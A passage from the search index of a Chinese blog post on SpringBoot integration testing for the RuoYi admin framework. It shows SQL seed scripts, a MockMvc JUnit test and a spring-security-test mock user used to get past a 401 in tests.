\u0026#39;\u0026#39; comment \u0026#39;字典标签\u0026#39;, dict_value varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;字典键值\u0026#39;, dict_type varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;字典类型\u0026#39;, css_class varchar(100) default null comment \u0026#39;样式属性（其他样式扩展）\u0026#39;, list_class varchar(100) default null comment \u0026#39;表格回显样式\u0026#39;, is_default char(1) default \u0026#39;N\u0026#39; comment \u0026#39;是否默认（Y是 N否）\u0026#39;, status char(1) default \u0026#39;0\u0026#39; comment \u0026#39;状态（0正常 1停用）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (dict_code) ) engine=innodb auto_increment=100 comment = \u0026#39;字典数据表\u0026#39;; 为了保证集成环境数据的一致性，我们可以把数据的初始化都放在 sys_user_it.sql 中，每次运行测试前都先执行 drop table if exists sys_config; create table sys_config ( config_id int(5) not null auto_increment comment \u0026#39;参数主键\u0026#39;, config_name varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;参数名称\u0026#39;, config_key varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;参数键名\u0026#39;, config_value varchar(500) default \u0026#39;\u0026#39; comment \u0026#39;参数键值\u0026#39;, config_type char(1) default \u0026#39;N\u0026#39; comment \u0026#39;系统内置（Y是 N否）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (config_id) ) engine=innodb auto_increment=100 comment = \u0026#39;参数配置表\u0026#39;; insert into sys_config values(1, \u0026#39;主框架页-默认皮肤样式名称\u0026#39;, \u0026#39;sys.index.skinName\u0026#39;, \u0026#39;skin-blue\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;蓝色 skin-blue、绿色 skin-green、紫色 skin-purple、红色 skin-red、黄色 skin-yellow\u0026#39; ); insert into sys_config values(2, \u0026#39;用户管理-账号初始密码\u0026#39;, \u0026#39;sys.user.initPassword\u0026#39;, \u0026#39;123456\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;初始化密码 123456\u0026#39; ); insert into sys_config values(3, \u0026#39;主框架页-侧边栏主题\u0026#39;, \u0026#39;sys.index.sideTheme\u0026#39;, \u0026#39;theme-dark\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;深色主题theme-dark，浅色主题theme-light\u0026#39; ); insert into sys_config values(4, \u0026#39;账号自助-验证码开关\u0026#39;, \u0026#39;sys.account.captchaEnabled\u0026#39;, \u0026#39;true\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;是否开启验证码功能（true开启，false关闭）\u0026#39;); insert into sys_config values(5, \u0026#39;账号自助-是否开启用户注册功能\u0026#39;, \u0026#39;sys.account.registerUser\u0026#39;, \u0026#39;false\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;是否开启注册用户功能（true开启，false关闭）\u0026#39;); insert into sys_config values(6, \u0026#39;用户登录-黑名单列表\u0026#39;, \u0026#39;sys.login.blackIPList\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;设置登录IP黑名单限制，多个匹配项以;分隔，支持匹配（*通配、网段）\u0026#39;); drop table if exists sys_job; create table sys_job ( job_id bigint(20) not null auto_increment comment \u0026#39;任务ID\u0026#39;, job_name varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;任务名称\u0026#39;, job_group varchar(64) default \u0026#39;DEFAULT\u0026#39; comment \u0026#39;任务组名\u0026#39;, invoke_target varchar(500) not null comment \u0026#39;调用目标字符串\u0026#39;, cron_expression varchar(255) default \u0026#39;\u0026#39; comment \u0026#39;cron执行表达式\u0026#39;, misfire_policy varchar(20) default \u0026#39;3\u0026#39; comment \u0026#39;计划执行错误策略（1立即执行 2执行一次 3放弃执行）\u0026#39;, concurrent char(1) default \u0026#39;1\u0026#39; comment \u0026#39;是否并发执行（0允许 1禁止）\u0026#39;, status char(1) default \u0026#39;0\u0026#39; comment \u0026#39;状态（0正常 1暂停）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default \u0026#39;\u0026#39; comment \u0026#39;备注信息\u0026#39;, primary key (job_id, job_name, job_group) ) engine=innodb auto_increment=100 comment = \u0026#39;定时任务调度表\u0026#39;; insert into sys_job values(1, \u0026#39;系统默认（无参）\u0026#39;, \u0026#39;DEFAULT\u0026#39;, \u0026#39;ryTask.ryNoParams\u0026#39;, \u0026#39;0/10 * * * * ?\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;\u0026#39;); insert into sys_job values(2, \u0026#39;系统默认（有参）\u0026#39;, \u0026#39;DEFAULT\u0026#39;, \u0026#39;ryTask.ryParams(\\\u0026#39;ry\\\u0026#39;)\u0026#39;, \u0026#39;0/15 * * * * ?\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;\u0026#39;); insert into sys_job values(3, \u0026#39;系统默认（多参）\u0026#39;, \u0026#39;DEFAULT\u0026#39;, \u0026#39;ryTask.ryMultipleParams(\\\u0026#39;ry\\\u0026#39;, true, 2000L, 316.50D, 100)\u0026#39;, \u0026#39;0/20 * * * * ?\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;\u0026#39;); drop table if exists sys_dict_data; create table sys_dict_data ( dict_code bigint(20) not null auto_increment comment \u0026#39;字典编码\u0026#39;, dict_sort int(4) default 0 comment \u0026#39;字典排序\u0026#39;, dict_label varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;字典标签\u0026#39;, dict_value varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;字典键值\u0026#39;, dict_type varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;字典类型\u0026#39;, css_class varchar(100) default null comment \u0026#39;样式属性（其他样式扩展）\u0026#39;, list_class varchar(100) default null comment \u0026#39;表格回显样式\u0026#39;, is_default char(1) default \u0026#39;N\u0026#39; comment \u0026#39;是否默认（Y是 N否）\u0026#39;, status char(1) default \u0026#39;0\u0026#39; comment \u0026#39;状态（0正常 1停用）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (dict_code) ) engine=innodb auto_increment=100 comment = \u0026#39;字典数据表\u0026#39;; insert into sys_dict_data values(1, 1, \u0026#39;男\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;sys_user_sex\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;性别男\u0026#39;); insert into sys_dict_data values(2, 2, \u0026#39;女\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;sys_user_sex\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;性别女\u0026#39;); insert into sys_dict_data values(3, 3, \u0026#39;未知\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;sys_user_sex\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;性别未知\u0026#39;); insert into sys_dict_data values(4, 1, \u0026#39;显示\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;sys_show_hide\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;primary\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;显示菜单\u0026#39;); insert into sys_dict_data values(5, 2, \u0026#39;隐藏\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;sys_show_hide\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;danger\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;隐藏菜单\u0026#39;); insert into sys_dict_data values(6, 1, \u0026#39;正常\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;sys_normal_disable\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;primary\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;正常状态\u0026#39;); insert into sys_dict_data values(7, 2, \u0026#39;停用\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;sys_normal_disable\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;danger\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;停用状态\u0026#39;); insert into sys_dict_data values(8, 1, \u0026#39;正常\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;sys_job_status\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;primary\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;正常状态\u0026#39;); insert into sys_dict_data values(9, 2, \u0026#39;暂停\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;sys_job_status\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;danger\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;停用状态\u0026#39;); insert into sys_dict_data values(10, 1, \u0026#39;默认\u0026#39;, \u0026#39;DEFAULT\u0026#39;, \u0026#39;sys_job_group\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;默认分组\u0026#39;); insert into sys_dict_data values(11, 2, \u0026#39;系统\u0026#39;, \u0026#39;SYSTEM\u0026#39;, \u0026#39;sys_job_group\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;系统分组\u0026#39;); insert into sys_dict_data values(12, 1, \u0026#39;是\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;sys_yes_no\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;primary\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;系统默认是\u0026#39;); insert into sys_dict_data values(13, 2, \u0026#39;否\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;sys_yes_no\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;danger\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;系统默认否\u0026#39;); insert into sys_dict_data values(14, 1, \u0026#39;通知\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;sys_notice_type\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;warning\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;通知\u0026#39;); insert into sys_dict_data values(15, 2, \u0026#39;公告\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;sys_notice_type\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;success\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;公告\u0026#39;); insert into sys_dict_data values(16, 1, \u0026#39;正常\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;sys_notice_status\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;primary\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;正常状态\u0026#39;); insert into sys_dict_data values(17, 2, \u0026#39;关闭\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;sys_notice_status\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;danger\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;关闭状态\u0026#39;); insert into sys_dict_data values(18, 99, \u0026#39;其他\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;sys_oper_type\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;info\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;其他操作\u0026#39;); insert into sys_dict_data values(19, 1, \u0026#39;新增\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;sys_oper_type\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;info\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;新增操作\u0026#39;); insert into sys_dict_data values(20, 2, \u0026#39;修改\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;sys_oper_type\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;info\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;修改操作\u0026#39;); insert into sys_dict_data values(21, 3, \u0026#39;删除\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;sys_oper_type\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;danger\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;删除操作\u0026#39;); insert into sys_dict_data values(22, 4, \u0026#39;授权\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;sys_oper_type\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;primary\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;授权操作\u0026#39;); insert into sys_dict_data values(23, 5, \u0026#39;导出\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;sys_oper_type\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;warning\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;导出操作\u0026#39;); insert into sys_dict_data values(24, 6, \u0026#39;导入\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;sys_oper_type\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;warning\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;导入操作\u0026#39;); insert into sys_dict_data values(25, 7, \u0026#39;强退\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;sys_oper_type\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;danger\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;强退操作\u0026#39;); insert into sys_dict_data values(26, 8, \u0026#39;生成代码\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;sys_oper_type\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;warning\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;生成操作\u0026#39;); insert into sys_dict_data values(27, 9, \u0026#39;清空数据\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;sys_oper_type\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;danger\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;清空操作\u0026#39;); insert into sys_dict_data values(28, 1, \u0026#39;成功\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;sys_common_status\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;primary\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;正常状态\u0026#39;); insert into sys_dict_data values(29, 2, \u0026#39;失败\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;sys_common_status\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;danger\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;停用状态\u0026#39;); drop table if exists sys_post; create table sys_post ( post_id bigint(20) not null auto_increment comment \u0026#39;岗位ID\u0026#39;, post_code varchar(64) not null comment \u0026#39;岗位编码\u0026#39;, post_name varchar(50) not null comment \u0026#39;岗位名称\u0026#39;, post_sort int(4) not null comment \u0026#39;显示顺序\u0026#39;, status char(1) not null comment \u0026#39;状态（0正常 1停用）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39;\tcomment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (post_id) ) engine=innodb comment = \u0026#39;岗位信息表\u0026#39;; drop table if exists sys_user_post; create table sys_user_post ( user_id bigint(20) not null comment \u0026#39;用户ID\u0026#39;, post_id bigint(20) not null comment \u0026#39;岗位ID\u0026#39;, primary key (user_id, post_id) ) engine=innodb comment = \u0026#39;用户与岗位关联表\u0026#39;; 添加 sys_user.sql：\ndrop table if exists sys_user; create table sys_user ( user_id bigint(20) not null auto_increment comment \u0026#39;用户ID\u0026#39;, dept_id bigint(20) default null comment \u0026#39;部门ID\u0026#39;, user_name varchar(30) not null comment \u0026#39;用户账号\u0026#39;, nick_name varchar(30) not null comment \u0026#39;用户昵称\u0026#39;, user_type varchar(2) default \u0026#39;00\u0026#39; comment \u0026#39;用户类型（00系统用户）\u0026#39;, email varchar(50) default \u0026#39;\u0026#39; comment \u0026#39;用户邮箱\u0026#39;, phonenumber varchar(11) default \u0026#39;\u0026#39; comment \u0026#39;手机号码\u0026#39;, sex char(1) default \u0026#39;0\u0026#39; comment \u0026#39;用户性别（0男 1女 2未知）\u0026#39;, avatar varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;头像地址\u0026#39;, password varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;密码\u0026#39;, status char(1) default \u0026#39;0\u0026#39; comment \u0026#39;帐号状态（0正常 1停用）\u0026#39;, del_flag char(1) default \u0026#39;0\u0026#39; comment \u0026#39;删除标志（0代表存在 2代表删除）\u0026#39;, login_ip varchar(128) default \u0026#39;\u0026#39; comment \u0026#39;最后登录IP\u0026#39;, login_date datetime comment \u0026#39;最后登录时间\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (user_id) ) engine=innodb auto_increment=100 comment = \u0026#39;用户信息表\u0026#39;; insert into sys_user values (1, 103, \u0026#39;admin\u0026#39;, \u0026#39;若依\u0026#39;, \u0026#39;00\u0026#39;, \u0026#39;ry@163.com\u0026#39;, \u0026#39;15888888888\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;$2a$10$7JB720yubVSZvUI0rEqK/.VqGOZTH.ulu33dHOiBE8ByOhJIrdAu2\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;127.0.0.1\u0026#39;, sysdate(), \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;管理员\u0026#39;); insert into sys_user values (2, 105, \u0026#39;ry\u0026#39;, \u0026#39;若依\u0026#39;, \u0026#39;00\u0026#39;, \u0026#39;ry@qq.com\u0026#39;, \u0026#39;15666666666\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;$2a$10$7JB720yubVSZvUI0rEqK/.VqGOZTH.ulu33dHOiBE8ByOhJIrdAu2\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;127.0.0.1\u0026#39;, sysdate(), \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;测试员\u0026#39;); 增加测试代码： package com.ruoyi.project.system.controller; import org.junit.jupiter.api.Test; import org.junit.jupiter.api.extension.ExtendWith; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc; import org.springframework.boot.test.context.SpringBootTest; import org.springframework.http.MediaType; import org.springframework.test.context.ActiveProfiles; import org.springframework.test.context.jdbc.Sql; import org.springframework.test.context.jdbc.SqlGroup; import org.springframework.test.context.junit.jupiter.SpringExtension; import org.springframework.test.web.servlet.MockMvc; import org.springframework.test.web.servlet.request.MockMvcRequestBuilders; import org.springframework.test.web.servlet.result.MockMvcResultMatchers; import static org.springframework.test.context.jdbc.Sql.ExecutionPhase.BEFORE_TEST_METHOD; @AutoConfigureMockMvc @SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT) // 指定了要激活的配置文件，对应上面创建的 `application-it.yml` @ActiveProfiles(\u0026#34;it\u0026#34;) @SqlGroup({ @Sql(value = \u0026#34;classpath:sql/sys_user_it.sql\u0026#34;, executionPhase = BEFORE_TEST_METHOD), @Sql(value = \u0026#34;classpath:sql/sys_user.sql\u0026#34;, executionPhase = BEFORE_TEST_METHOD) }) class SysUserControllerTest { @Autowired private MockMvc mockMvc; @Test void getInfo() throws Exception { mockMvc.perform(MockMvcRequestBuilders.get(\u0026#34;/system/user/1\u0026#34;) // 设置请求头 .accept(MediaType.APPLICATION_JSON)) // 验证响应状态码 .andExpect(MockMvcResultMatchers.status().isOk()) // 验证响应内容 .andExpect(MockMvcResultMatchers.content().string(\u0026#34;\u0026#34;)); } } 运行测试，测试将失败，后端返回：{\u0026quot;msg\u0026quot;:\u0026quot;请求访问：/system/user/1，认证失败，无法访问系统资源\u0026quot;,\u0026quot;code\u0026quot;:401}，权限校验还需要处理\n引入 SpdringSecurityTest 依赖 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.security\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-security-test\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;6.1.2\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 在测试代码中 Mock 用户，因为若依使用的自定义的 UserDetails，所以必须手动设置 UserDetails：.with(user(new LoginUser(new SysUser(1L), new HashSet\u0026lt;\u0026gt;(Arrays.asList(\u0026quot;system:user:query\u0026quot;)))))，不能直接用注解 Mock，更多写法可以参考：Running a Test as a User in Spring MVC Test package com.ruoyi.project.system.controller; import com.ruoyi.framework.security.LoginUser; import com.ruoyi.project.system.domain.SysUser; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc; import org.springframework.boot.test.context.SpringBootTest; import org.springframework.http.MediaType; import org.springframework.test.context.ActiveProfiles; import org.springframework.test.context.jdbc.Sql; import org.springframework.test.context.jdbc.SqlGroup; import org.springframework.test.web.servlet.MockMvc; import org.springframework.test.web.servlet.request.MockMvcRequestBuilders; import org.springframework.test.web.servlet.result.MockMvcResultMatchers; import org.springframework.web.context.WebApplicationContext; import java.util.Arrays; import java.util.HashSet; import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.user; import static org.springframework.test.context.jdbc.Sql.ExecutionPhase.BEFORE_TEST_METHOD; @AutoConfigureMockMvc @SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT) // 指定了要激活的配置文件，对应上面创建的 `application-it.yml` @ActiveProfiles(\u0026#34;it\u0026#34;) @SqlGroup({ @Sql(value = \u0026#34;classpath:sql/sys_user_it.sql\u0026#34;, executionPhase = BEFORE_TEST_METHOD), @Sql(value = \u0026#34;classpath:sql/sys_user.sql\u0026#34;, executionPhase = BEFORE_TEST_METHOD) }) class SysUserControllerTest { @Autowired private WebApplicationContext context; @Autowired private MockMvc mockMvc; @Test void getInfo() throws Exception { mockMvc.perform(MockMvcRequestBuilders.get(\u0026#34;/system/user/1\u0026#34;) .with(user(new LoginUser(new SysUser(1L), new HashSet\u0026lt;\u0026gt;(Arrays.asList(\u0026#34;system:user:query\u0026#34;))))) // 设置请求头 .accept(MediaType.APPLICATION_JSON)) // 验证响应状态码 .andExpect(MockMvcResultMatchers.status().isOk()) // 验证响应内容 .andExpect(MockMvcResultMatchers.jsonPath(\u0026#34;$.msg\u0026#34;).value(\u0026#34;操作成功\u0026#34;)) .andExpect(MockMvcResultMatchers.jsonPath(\u0026#34;$.code\u0026#34;).value(200)) .andExpect(MockMvcResultMatchers.jsonPath(\u0026#34;$.data.userName\u0026#34;).value(\u0026#34;admin\u0026#34;)) .andExpect(MockMvcResultMatchers.jsonPath(\u0026#34;$.data.roles[0].roleName\u0026#34;).value(\u0026#34;超级管理员\u0026#34;)); // 添加更多的断言 } } 上一节：SpringBoot 测试实践 - 1：常用的工具 下一节：SpringBoot 测试实践 - 3：@MockBean、@SpyBean 、提升测试运行速度、Testcontainer\n参考资料 MyBatis 测试 Spring boot Mybatis-Plus数据库单测实战（三种方式） 如何高效地协作开发：一些 Google 的实践 Java Web 项目单元测试/集成测试 @SpringBootTest not working (execution throwing NullPointerException) 直播回放 | 7月21日「JetBrains码上道」| 主题：Java中的测试与重构 代码很烂，但它能用，你敢重构吗？ 单元测试为什么在互联网滑铁卢 单元测试有必要吗？ Testing the Web Layer Software Testing Tutorial - Learn Unit Testing and Integration Testing Test-Driven Security\n","permalink":"https://aaronlinv.github.io/posts/springboot-%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%B7%B5---2%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E4%B8%8E%E9%9B%86%E6%88%90%E6%B5%8B%E8%AF%95/","summary":"\u003cp\u003e上一节：\u003ca href=\"https://www.cnblogs.com/aaronlinv/p/17645009.html\"\u003eSpringBoot 测试实践 - 1：常用的工具\u003c/a\u003e\n下一节：\u003ca href=\"https://www.cnblogs.com/aaronlinv/p/17652720.html\"\u003eSpringBoot 测试实践 - 3：@MockBean、@SpyBean 、提升测试运行速度、Testcontainer\u003c/a\u003e\u003c/p\u003e\n\u003c!-- raw HTML omitted --\u003e\n\u003chr\u003e\n\u003ch2 id=\"单元测试-vs-集成测试\"\u003e单元测试 vs. 